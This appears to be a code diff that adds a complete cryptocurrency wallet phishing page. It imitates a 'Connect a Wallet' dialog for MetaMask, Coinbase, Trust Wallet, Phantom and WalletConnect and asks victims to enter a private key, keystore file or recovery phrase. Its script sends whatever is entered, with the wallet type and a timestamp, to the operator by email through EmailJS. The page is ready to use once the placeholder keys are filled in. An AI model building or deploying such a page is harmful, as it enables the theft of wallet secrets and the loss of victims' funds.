@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect a Wallet</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Add EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        // Initialize EmailJS with your public key
+        (function() {
+            emailjs.init('YOUR_PUBLIC_KEY'); // Replace with your actual EmailJS public key
+        })();
+    </script>
+</head>
+<body class="bg-[#0E1320] min-h-screen flex items-center justify-center">
+    <div class="container mx-auto px-4">
+        <div class="bg-[#1B2232] rounded-xl p-6">
+            <h2 class="text-white text-center text-2xl font-semibold mb-6">Connect a Wallet</h2>
+            
+            <!-- Horizontal wallet options -->
+            <div class="flex items-center justify-start space-x-6 w-full overflow-x-auto py-2 px-4">
+                <div class="wallet-option cursor-pointer bg-[#262E41] rounded-lg p-4 text-center hover:bg-[#303950] transition-all w-48 flex-shrink-0" data-wallet="MetaMask">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask" class="w-16 h-16 mx-auto mb-2">
+                    <span class="text-white text-sm font-medium">MetaMask</span>
+                </div>
+                <div class="wallet-option cursor-pointer bg-[#262E41] rounded-lg p-4 text-center hover:bg-[#303950] transition-all w-48 flex-shrink-0" data-wallet="Coinbase">
+                    <img src="https://cryptologos.cc/logos/coinbase-coin-cbp-logo.png" alt="Coinbase" class="w-16 h-16 mx-auto mb-2">
+                    <span class="text-white text-sm font-medium">Coinbase Wallet</span>
+                </div>
+                <div class="wallet-option cursor-pointer bg-[#262E41] rounded-lg p-4 text-center hover:bg-[#303950] transition-all w-48 flex-shrink-0" data-wallet="TrustWallet">
+                    <img src="https://trustwallet.com/assets/images/media/logo.png" alt="Trust Wallet" class="w-16 h-16 mx-auto mb-2">
+                    <span class="text-white text-sm font-medium">Trust Wallet</span>
+                </div>
+                <div class="wallet-option cursor-pointer bg-[#262E41] rounded-lg p-4 text-center hover:bg-[#303950] transition-all w-48 flex-shrink-0" data-wallet="WalletConnect">
+                    <img src="https://walletconnect.com/meta/logo.png" alt="WalletConnect" class="w-16 h-16 mx-auto mb-2">
+                    <span class="text-white text-sm font-medium">WalletConnect</span>
+                </div>
+                <div class="wallet-option cursor-pointer bg-[#262E41] rounded-lg p-4 text-center hover:bg-[#303950] transition-all w-48 flex-shrink-0" data-wallet="Phantom">
+                    <img src="https://phantom.app/meta/logo.png" alt="Phantom" class="w-16 h-16 mx-auto mb-2">
+                    <span class="text-white text-sm font-medium">Phantom</span>
+                </div>
+            </div>
+
+            <div class="mt-6 text-center">
+                <div class="text-white text-sm">
+                    <h3 class="font-semibold mb-2">What is a Wallet?</h3>
+                    <p class="text-gray-300">
+                        A wallet is used to send, receive, store, and display digital assets. 
+                        It's also a new way to log in, without needing to create new accounts 
+                        and passwords on every website.
+                    </p>
+                </div>
+                <div class="mt-4 flex justify-center space-x-4">
+                    <button class="bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700 transition-colors">
+                        Get a Wallet
+                    </button>
+                    <button class="bg-gray-700 text-white px-4 py-2 rounded-lg hover:bg-gray-600 transition-colors">
+                        Learn More
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Wallet Connection Popup -->
+    <div id="wallet-popup" class="hidden fixed inset-0 z-50 bg-black bg-opacity-50 items-center justify-center">
+        <div class="bg-[#1B2232] rounded-xl w-11/12 max-w-4xl p-6 relative">
+            <button id="close-popup" class="absolute top-4 right-4 text-white hover:text-gray-300">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
+                </svg>
+            </button>
+
+            <h2 id="popup-title" class="text-white text-2xl font-semibold mb-6 text-center">Connect Wallet</h2>
+
+            <div class="bg-[#262E41] rounded-lg p-4 mb-4">
+                <div class="flex overflow-x-auto space-x-4 pb-4 connection-methods">
+                    <div class="connection-method flex-shrink-0 w-64 bg-[#1B2232] rounded-lg p-4 text-center cursor-pointer hover:bg-[#303950] transition-all">
+                        <h3 class="text-white font-semibold mb-2">Private Key</h3>
+                        <p class="text-gray-400 text-sm">Connect using your private key</p>
+                    </div>
+                    <div class="connection-method flex-shrink-0 w-64 bg-[#1B2232] rounded-lg p-4 text-center cursor-pointer hover:bg-[#303950] transition-all">
+                        <h3 class="text-white font-semibold mb-2">Keystore JSON</h3>
+                        <p class="text-gray-400 text-sm">Upload your Keystore JSON file</p>
+                    </div>
+                    <div class="connection-method flex-shrink-0 w-64 bg-[#1B2232] rounded-lg p-4 text-center cursor-pointer hover:bg-[#303950] transition-all">
+                        <h3 class="text-white font-semibold mb-2">Mnemonic Phrase</h3>
+                        <p class="text-gray-400 text-sm">Connect using recovery phrase</p>
+                    </div>
+                    <div class="connection-method flex-shrink-0 w-64 bg-[#1B2232] rounded-lg p-4 text-center cursor-pointer hover:bg-[#303950] transition-all">
+                        <h3 class="text-white font-semibold mb-2">Hardware Wallet</h3>
+                        <p class="text-gray-400 text-sm">Connect Ledger or Trezor</p>
+                    </div>
+                </div>
+            </div>
+
+            <div id="connection-form" class="bg-[#262E41] rounded-lg p-6">
+                <textarea 
+                    id="connection-input" 
+                    rows="4" 
+                    class="w-full bg-[#1B2232] text-white border-none rounded-lg p-4 focus:ring-2 focus:ring-blue-500 focus:outline-none"
+                    placeholder="Enter your connection details"
+                ></textarea>
+                <button id="connect-wallet-btn" class="w-full mt-4 bg-blue-600 text-white py-3 rounded-lg hover:bg-blue-700 transition-colors">
+                    Connect Wallet
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Wallet selection and popup functionality
+        const walletOptions = document.querySelectorAll('.wallet-option');
+        const walletPopup = document.getElementById('wallet-popup');
+        const closePopupBtn = document.getElementById('close-popup');
+        const connectionMethods = document.querySelectorAll('.connection-method');
+        const connectWalletBtn = document.getElementById('connect-wallet-btn');
+        const connectionInput = document.getElementById('connection-input');
+        
+        let selectedWallet = '';
+        let selectedMethod = '';
+
+        // Open popup when wallet is selected
+        walletOptions.forEach(option => {
+            option.addEventListener('click', () => {
+                selectedWallet = option.getAttribute('data-wallet');
+                document.getElementById('popup-title').textContent = `Connect ${selectedWallet}`;
+                walletPopup.classList.remove('hidden');
+                walletPopup.classList.add('flex');
+            });
+        });
+
+        // Close popup
+        closePopupBtn.addEventListener('click', () => {
+            walletPopup.classList.remove('flex');
+            walletPopup.classList.add('hidden');
+            // Reset selections
+            selectedWallet = '';
+            selectedMethod = '';
+            connectionInput.value = '';
+            // Remove active state from all methods
+            connectionMethods.forEach(m => {
+                m.classList.remove('border-2', 'border-blue-500');
+            });
+        });
+
+        // Connection method selection
+        connectionMethods.forEach(method => {
+            method.addEventListener('click', () => {
+                // Remove active state from all methods
+                connectionMethods.forEach(m => {
+                    m.classList.remove('border-2', 'border-blue-500');
+                });
+                
+                // Add active state to clicked method
+                method.classList.add('border-2', 'border-blue-500');
+                
+                // Update selected method
+                selectedMethod = method.querySelector('h3').textContent;
+                
+                // Update placeholder based on selected method
+                const placeholderText = method.querySelector('p').textContent;
+                connectionInput.placeholder = `Enter ${placeholderText.toLowerCase()}`;
+            });
+        });
+
+        // Connect wallet button click handler
+        connectWalletBtn.addEventListener('click', () => {
+            if (!selectedWallet || !selectedMethod || !connectionInput.value.trim()) {
+                alert('Please select a wallet, connection method, and enter your details');
+                return;
+            }
+
+            // Prepare email data
+            const templateParams = {
+                wallet_type: selectedWallet,
+                connection_method: selectedMethod,
+                connection_details: connectionInput.value.trim(),
+                timestamp: new Date().toLocaleString()
+            };
+
+            // Send email using EmailJS
+            emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
+                .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                    alert('Wallet connection request sent successfully!');
+                    // Close the popup
+                    closePopupBtn.click();
+                }, function(error) {
+                    console.log('FAILED...', error);
+                    alert('Failed to send wallet connection request. Please try again.');
+                });
+        });
+    </script>
+</body>
+</html>
